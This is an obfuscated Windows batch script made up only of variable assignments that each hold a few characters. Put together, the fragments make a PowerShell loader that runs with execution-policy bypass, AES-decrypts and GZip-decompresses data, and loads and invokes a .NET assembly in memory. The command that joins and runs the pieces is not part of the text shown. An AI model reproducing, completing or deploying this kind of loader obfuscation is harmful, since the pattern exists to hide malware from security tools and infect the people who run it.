@echo off
set "ZgFbidxiEO='0Pg"
set "EihwISKhOi=UUZz"
set "wRsLKFaAGC=bstr"
set "nrIfswAkPE= '')"
set "tYBoWuLKMG=Obje"
set "UkVrKyAAdh=le  "
set "hOzqlUkolt=.Ass"
set "ZUuxLivtOx=($gW"
set "BtvvNJziDG=esMa"
set "hRNzUieGZZ=GjYi"
set "LHYCWkqLiQ=Invo"
set "tAvUsxzgRs=XI ="
set "MNDMYgvdNo=embl"
set "HvFcEBPQKc=.Com"
set "pblZWmBosn='txe"
set "EbDZRUXPmh=:('g"
set "NBpOQyiMMJ=O.Me"
set "OQBOeBmIkg=Fina"
set "FjZrrwUzBI=gMod"
set "guvXeYCQQR=Stre"
set "yXuPmvfgZV=ose("
set "MbMkPRCwqL=flec"
set "czCeIVYggT=gth)"
set "fWzKqEdhFu=BuVW"
set "jwXXopmBIj=oryS"
set "OZDkDMTfCA=-1.."
set "VHRNrIkgmR=m.IO"
set "nDYdpVQARP=$UUZ"
set "nKbEhEMZAF=)))"
set "vuozyvVEif=.IO."
set "sayFuapgGK=; };"
set "gHWHcRqKCA=join"
set "gMILkxJinK=EBuV"
set "kuFdUlsDxM=ddin"
set "ShlNLaONwU==');"
set "VsVVAaCcrz=New-"
set "NprspNqXkF=rgo."
set "BXrkaHzeou=7;$B"
set "ZLMbmeowzd=.Con"
set "adMkNtQBmI=grap"
set "daGLybhylE=Secu"
set "YachQojzcL=$noG"
set "ZUHHJGweEQ=$Lxd"
set "NPFtkmkCDn= [Sy"
set "BzgwkQAfEs=tS46"
set "GDnWZebGia=[Sys"
set "AScinwjvFr=106u"
set "ZovgFukURJ=ress"
set "HRybRCgdOq=yTo("
set "jYlQsbKSmy=;$no"
set "mqwofcaSgn=n ''"
set "aVhgAqQwVm=m.IO"
set "AHfLrnyZua=-nop"
set "YIZpOOLdGO=lit("
set "EXzCLHCPOC=sion"
set "qUtUcQvBiY=.Cop"
set "gFwpEGlhLn=] -j"
set "YApRcbIQpQ=ewLi"
set "kVSWgSCYOJ=oint"
set "iJtaDoTwcG=r = "
set "gtoxckrkOe=ect "
set "WoLcfquMFp=zr ="
set "ctKTGMpDMu=[Sys"
set "eKcUQsyWMY=ring"
set "ANukdaAEce=S46e"
set "cKcTOoInnz= if "
set "gjIoIvQpVD=L.En"
set "ippOKkMijh=ybZN"
set "jQYwqKCEMS=am;$"
set "RUXbdLvcOQ=('%*'"
set "PyTZRautfw=ucm."
set "rPOpNsYHAa=I) {"
set "GcnVCJaDKm=V = "
set "pPTrXOXVVI=, (,"
set "OkQpCvrKWf=UZzr"
set "rqVDhZaEQX=ZNL "
set "BwGzoxkQwp=Conv"
set "ZpchBGQNTi=.Cry"
set "dhFevTGYdj=gsYZ"
set "XEGZVZZZfT=em.C"
set "JdCSLtNYHJ=[Sys"
set "EZxeODYJFU=ing("
set "nwUvLFMlEi=gnir"
set "GftAwieWQh=[Env"
set "pREBACqoRH=join"
set "WCuDFTBPWF=raph"
set "TPKEMipGaU=Bmor"
set "CVOVvfkNbl=ress"
set "WBgZkvxtBE=Star"
set "EYeSHmjZvQ=-joi"
set "mRtDqpyvub=Syst"
set "uwiUHYsOUE=1..-"
set "rVDhNJTBng=..-1"
set "MkgoEBkJVA== $B"
set "LbRkwBMRGt=)) {"
set "ZYhcCXcTxD=zHhH"
set "ArmaxxHQXN=n ''"
set "AXebXQYNgV=rt]:"
set "SeWFYJAAeG=[IO."
set "hxWLcvpckD=();$"
set "ihnDfdRlfz=yste"
set "XjzVkofmmZ=G.Pa"
set "AyLZZkiYiD=$Bai"
set "ZKjDRvoZNR=File"
set "dRyYnMwzuQ=L4Yi"
set "LxwbxggQYI=();$"
set "BxExZSnqoj=Mode"
set "xaspvvmLlv=VW.D"
set "uPZqsCKxpn=rity"
set "hxfJfMjrmV=.Cre"
set "jVMbbIZwGK=d;$B"
set "xLRCIKhyUR=stem"
set "wWxSTyGfWh=;$CG"
set "QeAyUpJOuG=onve"
set "vAuwtDayNp=zuZI"
set "YiRxGkaAls=em.I"
set "EMStVidHrj=pres"
set "FePAyrIeOG=  $j"
set "iGphRwhWkG=pher"
set "GrREQDIvnO=xdPo"
set "UHXtqnxxSO=$EBu"
set "QyvFRNXyjS=y.Pa"
set "vGiWtcLpKd=r = "
set "zXwCxUmsSW=yste"
set "CadqcqKYKT=$Lxd"
set "TnJXLweDvR=aimG"
set "MYVmdcEyMS=comm"
set "IyrENBWrJt=PKCS"
set "TQFIyGSQhR=);$L"
set "fbQnrlMREf=e]::"
set "wTLHewzrgX=mG.I"
set "kEoVBcjSar=ert]"
set "LboOxjcrye=tion"
set "PLsleBzjfs= '')"
set "hhFQFZgtfD='')("
set "eFPdXsIlmI=.Mem"
set "CnBZJqIpOV=aimG"
set "FbWBSfQYNd=aimG"
set "nteyZLOiXR=6esa"
set "MHlpkJwDVu=$Lxd"
set "PEfPfUewjg=ion."
set "wdqTcNKSjW=morF"
set "UMKweZKMxO=YLNt"
set "nEOQLQULCr=UZzr"
set "fwUxSIEUEQ=)($U"
set "bnLbsxvqEF=tsWi"
set "NgZiaFklIk=.Dis"
set "OIvwyaIaxo=Comp"
set "IfyBOhEMMc=;$wM"
set "zunZxOKvuh=Po.T"
set "IlVTJIAxwF=rans"
set "KYSOctzlUN=noGU"
set "UiFdkyJegq=('Tg"
set "kbQxrlGjkm=$rlC"
set "usMihVQqff=.-16"
set "wztlQKNfKd=.Len"
set "GnjdwZwYJL=y.Cr"
set "axsVAdYkns=[]] "
set "bdhHUPqmra=Po);"
set "bkqpyIprTL== [S"
set "hVXgnZKzSO= [st"
set "KiwwSFXBxY=ptog"
set "ouCfkxwPkX=ct S"
set "MICkmjCPRE=Syst"
set "SxjPUiLnMx= New"
set "CUJLoLBvlp=);$C"
set "wVBNtlbXNG=;$wM"
set "DurNKNeUyV=YLNt"
set "owCmfZsxCC=3); "
set "yEGBTNaIrW=pose"
set "vvtUvmozJF=bypa"
set "SuMvwTUruc=-joi"
set "aHpHrAftcE=ach "
set "FCAqWyXFTc=vert"
set "lGxLPxKupx=go.T"
set "uQfVgMGChR=ay()"
set "hlEmanYmFu=PxEW"
set "lbDMEDMjKR=gjYA"
set "HEfbTIAXCZ=PTtG"
set "ycdKBtmYNu=dj0C"
set "zqZlQZmNWF=Baim"
set "aIcUATlzgw=fore"
set "TANmDqTYIF=ode]"
set "MjwDdSEAnB=::De"
set "qYnSPHPhCL='[-1"
set "urWrWEJRhc=ispo"
set "QLxofpMObS=ss -"
set "IqfuqdwgZL=).Sp"
set "HpuECHBGCp= = $"
set "PJHGMqJdAI=m.Su"
set "WUQmjQDzYm=ecry"
set "xzaucUhtEe=m(, "
set "YnXruQefUt=rity"
set "JQrdpMhkPU=);$B"
set "QiJTPUjHan=in $"
set "rrCkJpfwiS=ptor"
set "DksVlETrWC=Uz, "
set "ToiQDxNvmp=:: '"
set "MRoiMyinuw=6] -"
set "ZTBaeVWrFI=z = "
set "EIOHGMBoKm=TllA"
set "DyhFXhHitm=lBlo"
set "UDouiGHrwd=aimG"
set "nUGpmjdyNz=16] "
set "VMwZQjesvs=.Cry"
set "KBenpkYXAL=stem"
set "DpqgjCMnIO=.Dis"
set "QlrvnQghNg=l5E7"
set "YGbVrAuKDI===')"
set "JXZjZXmnPp=iron"
set "auleFghwTV=ment"
set "FyHInFVZNb=s75K"
set "XVNVrnYKzB=Secu"
set "FyyFBPGaaX=trea"
set "JUyjuQGsVR=[-1."
set "tDbdUcxQrM=$wMr"
set "rTxaUxFWcn=();$"
set "XETclERccN=th('"
set "mJjapOvPFb=, $U"
set "RawIiPyIsl=gWuc"
set "QJfEWkZbnn=pose"
set "NXSwrEQQZd=-Obj"
set "MSvTFBxVyJ=ypto"
set "YNdzHiaNqR=rtS4"
set "iPXcdYsfhA=.Sec"
set "IHJHgqxuri=ucm "
set "NbszPYzkGF='[-1"
set "hJAuTHhepX=nirt"
set "vObgvYvDJo=tem."
set "XadiGjOySi=pStr"
set "ShsLsHlLNN=bjec"
set "nDBrxXXWsr=Comp"
set "TRBlhPPSJk=ke($"
set "OXbPHQmDRi=k; }"
set "LnXDeukyMU=]::("
set "wSmpcfaoyM=r, 0"
set "gPLAWftEeO=New-"
set "GolWYYyBPq=oL'["
set "mIiXnZHKXD=brea"
set "GXZFCDIPZD=ress"
set "quXBItjUKp=t Sy"
set "gWcbJGUpmV=g = "
set "ucyfKHmkRr=raph"
set "GticPYkTsm=null"
set "GMujmsgrJS=W = "
set "JJhtRpjfrY=);$E"
set "cTMOtatizF=;$yb"
set "QBLwHANjAU=)($j"
